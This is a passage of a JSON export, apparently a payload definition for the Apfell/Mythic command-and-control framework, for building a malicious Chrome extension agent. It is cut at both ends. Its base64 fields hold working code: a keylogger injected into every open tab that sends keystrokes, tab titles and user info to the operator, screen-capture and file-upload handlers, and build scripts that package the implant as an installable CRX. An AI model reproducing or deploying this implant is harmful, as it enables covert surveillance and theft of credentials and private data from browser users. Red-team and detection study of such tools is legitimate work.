RleF07CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vIGNoZWNrIGZvciBzY3JlZW5jYXB0dXJlcyAKICAgICAgICAgICAgICAgIGlmIChzY3JlZW5jYXB0dXJlcy5sZW5ndGggPiAwKSB7CiAgICAgICAgICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBzY3JlZW5jYXB0dXJlcy5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBjYXB0dXJlID0gc2NyZWVuY2FwdHVyZXNbaV07CiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBlcXVhbCA9IHJlc3BvbnNlLnRhc2tfaWQubG9jYWxlQ29tcGFyZShjYXB0dXJlLnRhc2tfaWQpOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoZXF1YWwgPT09IDApIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIFRPRE86IGNodW5rIHRoZSBzY3JlZW5jYXB0dXJlIGRhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCByYXcgPSBjYXB0dXJlLmltYWdlOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCByZXNwID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjaHVua19udW0nOiAxLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdmaWxlX2lkJzogcmVzcG9uc2UuZmlsZV9pZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2h1bmtfZGF0YSc6IHJhdywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndGFza19pZCc6IGNhcHR1cmUudGFza19pZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IG91dGVyX3Jlc3BvbnNlID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdhY3Rpb24nOidwb3N0X3Jlc3BvbnNlJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAncmVzcG9uc2VzJzpbcmVzcF0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2RlbGVnYXRlcyc6W10KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGVuYyA9IEpTT04uc3RyaW5naWZ5KG91dGVyX3Jlc3BvbnNlKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBmaW5hbCA9IGFwZmVsbC5hcGZlbGxpZCArIGVuYzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBtc2cgPSBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChmaW5hbCkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG91dC5wdXNoKG1zZyk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2UgPSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3Rhc2tfaWQnOnJlc3BvbnNlLnRhc2tfaWQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3VzZXJfb3V0cHV0Jzonc2NyZWVuY2FwdHVyZSBjb21wbGV0ZScsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NvbXBsZXRlJzp0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXRlcl9yZXNwb25zZSA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnYWN0aW9uJzoncG9zdF9yZXNwb25zZScsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3Jlc3BvbnNlcyc6W3Jlc3BvbnNlXSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZGVsZWdhdGVzJzpbXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmMgPSBKU09OLnN0cmluZ2lmeShvdXRlcl9yZXNwb25zZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaW5hbCA9IGFwZmVsbC5hcGZlbGxpZCArIGVuYzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1zZyA9IGJ0b2EodW5lc2NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KGZpbmFsKSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3V0LnB1c2gobXNnKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzY3JlZW5jYXB0dXJlc1tpXSA9IHt9OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHNjcmVlbmNhcHR1cmVzLmxlbmd0aCA9PT0gMSApIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzY3JlZW5jYXB0dXJlcyA9IFtdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgICAgY2FzZSAndXBsb2FkJyA6IHsKICAgICAgICAgICAgLy8gY2hlY2sgZm9yIGxvYWQgY29tbWFuZCByZXNwb25zZXMKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIChsb2Fkcy5sZW5ndGggPiAwKSB7CiAgICAgICAgICAgICAgICBmb3IgKGxldCBqID0gMDsgaiA8IGxvYWRzLmxlbmd0aDsgaisrKSB7CiAgICAgICAgICAgICAgICAgICAgbGV0IGVxdWFsID0gbWVzc2FnZS5maWxlX2lkLmxvY2FsZUNvbXBhcmUobG9hZHNbal0uZmlsZV9pZCk7CiAgICAgICAgICAgICAgICAgICAgaWYgKGVxdWFsID09PSAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBsb2FkID0gbG9hZHNbal07CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChtZXNzYWdlLmNodW5rX251bSA8IG1lc3NhZ2UudG90YWxfY2h1bmtzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgcmF3ID0gYXRvYihtZXNzYWdlLmNodW5rX2RhdGEpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9hZC5kYXRhLnB1c2goLi4ucmF3KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvYWRzW2pdID0gbG9hZDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCByZXNwID0geydhY3Rpb24nOid1cGxvYWQnLCdjaHVua19zaXplJzogMTAyNDAwMCwgJ2NodW5rX251bSc6KG1lc3NhZ2UuY2h1bmtfbnVtICsgMSksICdmaWxlX2lkJzpsb2FkLmZpbGVfaWQsICdmdWxsX3BhdGgnOicnfTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBlbmNvZGVkUmVzcG9uc2UgPSBKU09OLnN0cmluZ2lmeShyZXNwKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBmaW5hbCA9IGFwZmVsbC5hcGZlbGxpZCArIGVuY29kZWRSZXNwb25zZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBtc2cgPSBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChmaW5hbCkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG91dC5wdXNoKG1zZyk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAobWVzc2FnZS5jaHVua19udW0gPT09IG1lc3NhZ2UudG90YWxfY2h1bmtzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgcmF3ID0gYXRvYihtZXNzYWdlLmNodW5rX2RhdGEpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9hZC5kYXRhLnB1c2goLi4ucmF3KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBuZXdfZGljdCA9IGRlZmF1bHRfbG9hZChsb2FkLmRhdGEuam9pbigiIikpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZHNfZGljdCA9IE9iamVjdC5hc3NpZ24oe30sIGNvbW1hbmRzX2RpY3QsIG5ld19kaWN0KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vY29uc29sZS5sb2coT2JqZWN0LnZhbHVlcyhjb21tYW5kc19kaWN0KSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBDMi5jb21tYW5kcyA9IE9iamVjdC5rZXlzKGNvbW1hbmRzX2RpY3QpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHJlc3BvbnNlID0geyd0YXNrX2lkJzpsb2FkLnRhc2tfaWQsICd1c2VyX291dHB1dCc6IGxvYWQubmFtZSArICIgbG9hZGVkIiwgImNvbXBsZXRlZCI6dHJ1ZX07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgb3V0ZXJfcmVzcG9uc2UgPSB7J2FjdGlvbic6J3Bvc3RfcmVzcG9uc2UnLCAncmVzcG9uc2VzJzpbcmVzcG9uc2VdLCAnZGVsZWdhdGVzJzpbXX07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZW5jID0gSlNPTi5zdHJpbmdpZnkob3V0ZXJfcmVzcG9uc2UpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGZpbmFsID0gYXBmZWxsLmFwZmVsbGlkICsgZW5jOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IG1zZyA9IGJ0b2EodW5lc2NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KGZpbmFsKSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9hZHNbal0gPSB7fTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG91dC5wdXNoKG1zZyk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9ICAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfTsKCi8vIExpc3RlbmVyIGZvciBrZXlsb2dnZXIKY2hyb21lLnJ1bnRpbWUub25Db25uZWN0LmFkZExpc3RlbmVyKGZ1bmN0aW9uKHBvcnQpIHsKICAgIC8vY29uc29sZS5sb2coIlJlY2VpdmVkIG5ldyBydW50aW1lIGNvbm5lY3Rpb24gZnJvbSBwb3J0ICIgKyBwb3J0Lm5hbWUpOwogICAgdmFyIHJlc3VsdCA9IHBvcnQubmFtZS5sb2NhbGVDb21wYXJlKCJrZXlsb2dnZXIiKTsKICAgIGlmIChyZXN1bHQgPT09IDApIHsKICAgICAgICBwb3J0Lm9uTWVzc2FnZS5hZGRMaXN0ZW5lcihmdW5jdGlvbihtc2cpIHsKICAgICAgICAgICAgbGV0IGttc2cgPSB7CiAgICAgICAgICAgICAgICAidGFza19pZCI6IGxvZ2dlciwKICAgICAgICAgICAgICAgICJ1c2VyIjogYXBmZWxsLnVzZXJpbmZvLAogICAgICAgICAgICAgICAgIndpbmRvd190aXRsZSI6IHBvcnQuTWVzc2FnZVNlbmRlci50YWJzLlRhYi50aXRsZSwKICAgICAgICAgICAgICAgICJrZXlzdHJva2VzIjogSlNPTi5zdHJpbmdpZnkobXNnKQogICAgICAgICAgICB9OwogICAgICAgICAgICAvL2NvbnNvbGUubG9nKCJTZW5kaW5nIGtleXN0cm9rZXMgIiArIEpTT04uc3RyaW5naWZ5KGttc2cpKTsKICAgICAgICAgICAgb3V0LnB1c2goa21zZyk7CiAgICAgICAgfSk7CiAgICB9Cn0pOw=="
          }
        ]
      },
      "load_transforms": [
        {
          "parameter": "",
          "description": "",
          "transform": "combineCommands",
          "parameter_type": "None",
          "order": 1
        }
      ],
      "create_transforms": [
        {
          "parameter": "example",
          "description": "The name of your extension",
          "transform": "save_string_parameter",
          "parameter_type": "String",
          "order": 1
        },
        {
          "parameter": "",
          "description": "",
          "transform": "chrome_compile_and_return",
          "parameter_type": "String",
          "order": 5
        },
        {
          "parameter": "http:\/\/www.example.com\/update.xml",
          "description": "The URL that hosts the update manifest file (xml)",
          "transform": "save_string_parameter",
          "parameter_type": "String",
          "order": 2
        },
        {
          "parameter": "http:\/\/www.example.com",
          "description": "The home page url for your extension. This will be used as the default location for when a user clicks on your extension icon in the toolbar",
          "transform": "save_string_parameter",
          "parameter_type": "String",
          "order": 3
        },
        {
          "parameter": "1.0",
          "description": "The version for your extension",
          "transform": "save_string_parameter",
          "parameter_type": "String",
          "order": 4
        }
      ],
      "transforms": [
        {
          "code": "YXN5bmMgZGVmIGNvbWJpbmVDb21tYW5kcyhzZWxmLCBwcmlvcl9vdXRwdXQ6IExpc3Rbc3RyXSwgcGFyYW1ldGVyOiBOb25lKSAtPiBieXRlczoKICAgICMgZXhwZWN0cyBhIGxpc3Qgb2YgY29tbWFuZHMgYW5kIHJldHVybnMgdGhlICJjb21tYW5kIiBwb3J0aW9uIG9mIGFsbCB0aGUgZmlsZXMgdG9nZXRoZXIKICAgIGNvbnRlbnQgPSBiIiIKICAgIGZvciBuIGluIHByaW9yX291dHB1dDoKICAgICAgICAjIG9ubHkgcmVhZCB1cCB1bnRpbCB0aGUgZmxhZyBDT01NQU5EX0VORFNfSEVSRQogICAgICAgIGZpbGVzID0gb3MubGlzdGRpcihzZWxmLndvcmtpbmdfZGlyICsgIi97fSIuZm9ybWF0KG4pKQogICAgICAgIGZvciBmIGluIGZpbGVzOgogICAgICAgICAgICBmaWxlX2NvbnRlbnQgPSBvcGVuKHNlbGYud29ya2luZ19kaXIgKyAiL3t9L3t9Ii5mb3JtYXQobiwgZikpLnJlYWQoKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbmRfaW5kZXggPSBmaWxlX2NvbnRlbnQuaW5kZXgoIkNPTU1BTkRfRU5EU19IRVJFIikKICAgICAgICAgICAgICAgIGZpbGVfY29udGVudCA9IGZpbGVfY29udGVudFswOmVuZF9pbmRleF0KICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICBmaWxlX2NvbnRlbnQgPSBieXRlYXJyYXkoZmlsZV9jb250ZW50LmVuY29kZSgndXRmLTgnKSkKICAgICAgICAgICAgY29udGVudCArPSBmaWxlX2NvbnRlbnQKICAgIHJldHVybiBjb250ZW50",
          "name": "combineCommands",
          "parameter_type": "None",
          "description": "This combines all of the selected commands together",
          "is_command_code": false,
          "timestamp": "03\/20\/2020 01:01:59",
          "id": 9,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIHNhdmVfc3RyaW5nX3BhcmFtZXRlcihzZWxmLCBwcmlvcl9vdXRwdXQ6IE5vbmUsIHBhcmFtZXRlcjogc3RyKSAtPiBOb25lOgogICAgc2VsZi5zYXZlZF9hcnJheS5hcHBlbmQocGFyYW1ldGVyKQogICAgcmV0dXJuIE5vbmU=",
          "name": "save_string_parameter",
          "parameter_type": "String",
          "description": "Save a string parameter to saved_array",
          "is_command_code": false,
          "timestamp": "03\/20\/2020 01:01:59",
          "id": 7,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIGNocm9tZV9jb21waWxlX2FuZF9yZXR1cm4oc2VsZiwgcHJpb3Jfb3V0cHV0OiBOb25lLCBwYXJhbWV0ZXI6IHN0cikgLT4gYnl0ZWFycmF5OgogICAgaWYgbGVuKHNlbGYuc2F2ZWRfYXJyYXkpICE9IDQ6CiAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCJJbmNvcnJlY3QgbnVtYmVyIG9mIHNhdmVkIGFyZ3VtZW50cyIpCiAgICBleHRfbmFtZSA9IHNlbGYuc2F2ZWRfYXJyYXlbMF0KICAgIHVwZGF0ZV91cmwgPSBzZWxmLnNhdmVkX2FycmF5WzFdCiAgICBob21lX3BhZ2VfdXJsID0gc2VsZi5zYXZlZF9hcnJheVsyXQogICAgdmVyc2lvbiA9IHNlbGYuc2F2ZWRfYXJyYXlbM10KICAgIGZpbGUgPSBvcGVuKCJ7fS9tYW5pZmVzdC10ZW1wbGF0ZS5qc29uIi5mb3JtYXQoc2VsZi53b3JraW5nX2RpciksICdyJykucmVhZCgpCiAgICBmaWxlID0gZmlsZS5yZXBsYWNlKCJFWFRFTlNJT05fTkFNRV9SRVBMQUNFIiwgZXh0X25hbWUpCiAgICBmaWxlID0gZmlsZS5yZXBsYWNlKCJERVNDUklQVElPTl9SRVBMQUNFIiwgZXh0X25hbWUpCiAgICBmaWxlID0gZmlsZS5yZXBsYWNlKCJodHRwOi8vd3d3LmV4YW1wbGUuY29tL2RlYnVnZXh0ZW5zaW9uIiwgaG9tZV9wYWdlX3VybCkKICAgIGZpbGUgPSBmaWxlLnJlcGxhY2UoImh0dHA6Ly93d3cuZXhhbXBsZS5jb20vdXBkYXRlLnhtbCIsIHVwZGF0ZV91cmwpCiAgICBmaWxlID0gZmlsZS5yZXBsYWNlKCJWRVJTSU9OX1JFUExBQ0UiLCB2ZXJzaW9uKQogICAgdXBkYXRlZF9maWxlID0gb3Blbigie30vZXh0ZW5zaW9uL21hbmlmZXN0Lmpzb24iLmZvcm1hdChzZWxmLndvcmtpbmdfZGlyKSwgJ3cnKQogICAgdXBkYXRlZF9maWxlLndyaXRlKGZpbGUpCiAgICB1cGRhdGVkX2ZpbGUuY2xvc2UoKQogICAgI3JhaXNlIEV4Y2VwdGlvbigiY3VycmVudCB3b3JraW5nIGRpcmVjdG9yeTogIiArIHN0cihvcy5saXN0ZGlyKHNlbGYud29ya2luZ19kaXIpKSkKICAgIHNodXRpbC5jb3B5KCJ7fS9jaHJvbWUtZXh0ZW5zaW9uLmpzIi5mb3JtYXQoc2VsZi53b3JraW5nX2RpciksInt9L2V4dGVuc2lvbi9tYWluLmpzIi5mb3JtYXQoc2VsZi53b3JraW5nX2RpcikpCiAgICAjY29tbWFuZCA9ICJjcCB7fS9jaHJvbWUtZXh0ZW5zaW9uLmpzIHt9L2V4dGVuc2lvbi9zcmMvYmcvbWFpbi5qczsiLmZvcm1hdChzZWxmLndvcmtpbmdfZGlyLCBzZWxmLndvcmtpbmdfZGlyKQogICAgY29tbWFuZCA9ICJweXRob24gL0NSWDMtQ3JlYXRvci9tYWluLnB5IHt9L2V4dGVuc2lvbiIuZm9ybWF0KHNlbGYud29ya2luZ19kaXIpCiAgICBwcm9jID0gYXdhaXQgYXN5bmNpby5jcmVhdGVfc3VicHJvY2Vzc19zaGVsbChjb21tYW5kLCBzdGRvdXQ9YXN5bmNpby5zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1hc3luY2lvLnN1YnByb2Nlc3MuUElQRSkKICAgIHN0ZG91dCwgc3RkZXJyID0gYXdhaXQgcHJvYy5jb21tdW5pY2F0ZSgpCiAgICBpZiBzdGRvdXQ6CiAgICAgICAgcHJpbnQoZidbc3Rkb3V0XVxue3N0ZG91dC5kZWNvZGUoKX0nKQogICAgaWYgc3RkZXJyOgogICAgICAgIHByaW50KGYnW3N0ZGVycl1cbntzdGRlcnIuZGVjb2RlKCl9JykKICAgIGlmIG9zLnBhdGguZXhpc3RzKCJ7fS9leHRlbnNpb24uY3J4Ii5mb3JtYXQoc2VsZi53b3JraW5nX2RpcikpOgogICAgICAgIHRlbXBfdXVpZCA9IHN0cih1dWlkLnV1aWQ0KCkpCiAgICAgICAgc2h1dGlsLm1ha2VfYXJjaGl2ZSh0ZW1wX3V1aWQsICJ6aXAiLCAie30iLmZvcm1hdChzZWxmLndvcmtpbmdfZGlyKSkKICAgICAgICByZXR1cm4gYnl0ZWFycmF5KG9wZW4odGVtcF91dWlkICsgIi56aXAiLCAncmInKS5yZWFkKCkpCiAgICBlbHNlOgogICAgICAgIHJhaXNlIEV4Y2VwdGlvbihzdGRlcnIuZGVjb2RlKCkp",
          "name": "chrome_compile_and_return",
          "parameter_type": "String",
          "description": "",
          "is_command_code": false,
          "timestamp": "03\/20\/2020 01:01:59",
          "id": 10,
          "operator": "apfell_admin"
        }
      ],
      "commands": [
        {
          "needs_admin": false,
          "help_cmd": "keylogger {\"command\":\"start\"}",
          "version": 4,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Start the keylogger. This will inject the keylogger into every open tab. ",
          "cmd": "keylogger",
          "parameters": [
            {
              "type": "Choice",
              "hint": "",
              "choices": "start\nstop",
              "required": true,
              "name": "command"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "keylogger.js": "ZXhwb3J0cy5rZXlsb2dnZXIgPSBmdW5jdGlvbiAodGFzaykgewogICAgdHJ5IHsKICAgICAgICBsZXQgYXJncyA9IEpTT04ucGFyc2UodGFzay5wYXJhbWV0ZXJzLnRvU3RyaW5nKCkpOwogICAgICAgIHN3aXRjaCAoYXJncy5jb21tYW5kKSB7CiAgICAgICAgICAgIGNhc2UgInN0YXJ0IjoKICAgICAgICAgICAgICAgIGlmIChsb2dnZXIubGVuZ3RoID4gMCkgewogICAgICAgICAgICAgICAgICAgIGxldCByZXNwb25zZSA9IHsidGFza19pZCI6dGFzay5pZCwgInVzZXJfb3V0cHV0IjoiS2V5bG9nZ2VyIGFscmVhZHkgcnVubmluZyIsICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgICAgICAgICAgICAgICAgICBsZXQgb3V0ZXJfcmVzcG9uc2UgPSB7ImFjdGlvbiI6InBvc3RfcmVzcG9uc2UiLCAicmVzcG9uc2VzIjpbcmVzcG9uc2VdLCAiZGVsZWdhdGVzIjpbXX07CiAgICAgICAgICAgICAgICAgICAgbGV0IGVuYyA9IEpTT04uc3RyaW5naWZ5KG91dGVyX3Jlc3BvbnNlKTsKICAgICAgICAgICAgICAgICAgICBsZXQgZmluYWwgPSBhcGZlbGwuYXBmZWxsaWQgKyBlbmM7CiAgICAgICAgICAgICAgICAgICAgbGV0IG1zZyA9IGJ0b2EodW5lc2NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KGZpbmFsKSkpOwogICAgICAgICAgICAgICAgICAgIG91dC5wdXNoKG1zZyk7CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgY2hyb21lLnRhYnMub25VcGRhdGVkLmFkZExpc3RlbmVyKGZ1bmN0aW9uIGtleWxvZyh0YWJpZCwgaW5mbykgewogICAgICAgICAgICAgICAgICAgIGNocm9tZS50YWJzLmV4ZWN1dGVTY3JpcHQodGFiaWQsIHsKICAgICAgICAgICAgICAgICAgICAgICAgYWxsRnJhbWVzOiB0cnVlLAogICAgICAgICAgICAgICAgICAgICAgICBmaWxlOiAndXRpbHMva2wuanMnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9KTsKCiAgICAgICAgICAgICAgICBsb2dnZXIgPSB0YXNrLnRhc2tfaWQ7CiAgICAgICAgICAgICAgICBsZXQgcmVzcCA9IHsidGFza19pZCI6dGFzay5pZCwgInVzZXJfb3V0cHV0IjoiS2V5bG9nZ2VyIHN0YXJ0ZWQiLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICAgICAgICAgICAgICBsZXQgb3V0ZXJfcmVzcCA9IHsiYWN0aW9uIjoicG9zdF9yZXNwb25zZSIsICJyZXNwb25zZXMiOltyZXNwXSwgImRlbGVnYXRlcyI6W119OwogICAgICAgICAgICAgICAgbGV0IGUgPSBKU09OLnN0cmluZ2lmeShvdXRlcl9yZXNwKTsKICAgICAgICAgICAgICAgIGxldCBmID0gYXBmZWxsLmFwZmVsbGlkICsgZTsKICAgICAgICAgICAgICAgIGxldCBtID0gYnRvYSh1bmVzY2FwZShlbmNvZGVVUklDb21wb25lbnQoZikpKTsKICAgICAgICAgICAgICAgIG91dC5wdXNoKG0pOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgInN0b3AiOgogICAgICAgICAgICAgICAgY2hyb21lLnRhYnMub25VcGRhdGVkLnJlbW92ZUxpc3RlbmVyKGtleWxvZyk7CiAgICAgICAgICAgICAgICBsb2dnZXIgPSAiIjsKICAgICAgICAgICAgICAgIGxldCByZXNwb25zZSA9IHsidGFza19pZCI6dGFzay5pZCwgInVzZXJfb3V0cHV0Ijoia2V5bG9nZ2VyIHN0b3BwZWQiLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICAgICAgICAgICAgICBsZXQgb3V0ZXJfcmVzcG9uc2UgPSB7ImFjdGlvbiI6InBvc3RfcmVzcG9uc2UiLCAicmVzcG9uc2VzIjpbcmVzcG9uc2VdLCAiZGVsZWdhdGVzIjpbXX07CiAgICAgICAgICAgICAgICBsZXQgZW5jID0gSlNPTi5zdHJpbmdpZnkob3V0ZXJfcmVzcG9uc2UpOwogICAgICAgICAgICAgICAgbGV0IGZpbmFsID0gYXBmZWxsLmFwZmVsbGlkICsgZW5jOwogICAgICAgICAgICAgICAgbGV0IG1zZyA9IGJ0b2EodW5lc2NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KGZpbmFsKSkpOwogICAgICAgICAgICAgICAgb3V0LnB1c2gobXNnKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQogICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICBsZXQgcmVzcG9uc2UgPSB7InRhc2tfaWQiOnRhc2suaWQsICJ1c2VyX291dHB1dCI6ZXJyb3IudG9TdHJpbmcoKSwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiJlcnJvciJ9OwogICAgICAgIGxldCBvdXRlcl9yZXNwb25zZSA9IHsiYWN0aW9uIjoicG9zdF9yZXNwb25zZSIsICJyZXNwb25zZXMiOltyZXNwb25zZV0sICJkZWxlZ2F0ZXMiOltdfTsKICAgICAgICBsZXQgZW5jID0gSlNPTi5zdHJpbmdpZnkob3V0ZXJfcmVzcG9uc2UpOwogICAgICAgIGxldCBmaW5hbCA9IGFwZmVsbC5hcGZlbGxpZCArIGVuYzsKICAgICAgICBsZXQgbXNnID0gYnRvYSh1bmVzY2FwZShlbmNvZGVVUklDb21wb25lbnQoZmluYWwpKSk7CiAgICAgICAgb3V0LnB1c2gobXNnKTsKICAgIH0KfTsKQ09NTUFORF9FTkRTX0hFUkU="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "exit",
          "version": 1,
          "is_exit": true,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Exit the extension",
          "cmd": "exit",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "exit.js": "ZXhwb3J0cy5leGl0ID0gZnVuY3Rpb24odGFzaykgewogICAgdHJ5IHsKICAgICAgICBsZXQgcmVzcG9uc2UgPSB7InRhc2tfaWQiOnRhc2suaWQsICJ1c2VyX291dHB1dCI6ImV4aXRpbmciLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICAgICAgbGV0IG91dGVyX3Jlc3BvbnNlID0geyJhY3Rpb24iOiJwb3N0X3Jlc3BvbnNlIiwgInJlc3BvbnNlcyI6W3Jlc3BvbnNlXSwgImRlbGVnYXRlcyI6W119OwogICAgICAgIGxldCBlbmMgPSBKU09OLnN0cmluZ2lmeShvdXRlcl9yZXNwb25zZSk7CiAgICAgICAgbGV0IGZpbmFsID0gYXBmZWxsLmFwZmVsbGlkICsgZW5jOwogICAgICAgIGxldCBtc2cgPSBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChmaW5hbCkpKTsKICAgICAgICBsZXQgbWV0YSA9IHsKICAgICAgICAgICAgImRhdGEiOiBtc2csCiAgICAgICAgICAgICJjbGllbnQiOiB0cnVlLAogICAgICAgICAgICAidGFnIjoiIiwKICAgICAgICB9OwogICAgICAgIGxldCBmdWxsbXNnID0gSlNPTi5zdHJpbmdpZnkobWV0YSk7CiAgICAgICAgY29ubmVjdGlvbi5zZW5kKGZ1bGxtc2cpOwogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24gbmFtZShwYXJhbXMpIHsKICAgICAgICAgICAgY29ubmVjdGlvbi5jbG9zZSgpOwogICAgICAgIH0sIEMyLmludGVydmFsKTsKICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgbGV0IHJlc3BvbnNlID0geyJ0YXNrX2lkIjp0YXNrLmlkLCAidXNlcl9vdXRwdXQiOmVycm9yLnRvU3RyaW5nKCksICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjoiZXJyb3IifTsKICAgICAgICBsZXQgb3V0ZXJfcmVzcG9uc2UgPSB7ImFjdGlvbiI6InBvc3RfcmVzcG9uc2UiLCAicmVzcG9uc2VzIjpbcmVzcG9uc2VdLCAiZGVsZWdhdGVzIjpbXX07CiAgICAgICAgbGV0IGVuYyA9IEpTT04uc3RyaW5naWZ5KG91dGVyX3Jlc3BvbnNlKTsKICAgICAgICBsZXQgZmluYWwgPSBhcGZlbGwuYXBmZWxsaWQgKyBlbmM7CiAgICAgICAgbGV0IG1zZyA9IGJ0b2EodW5lc2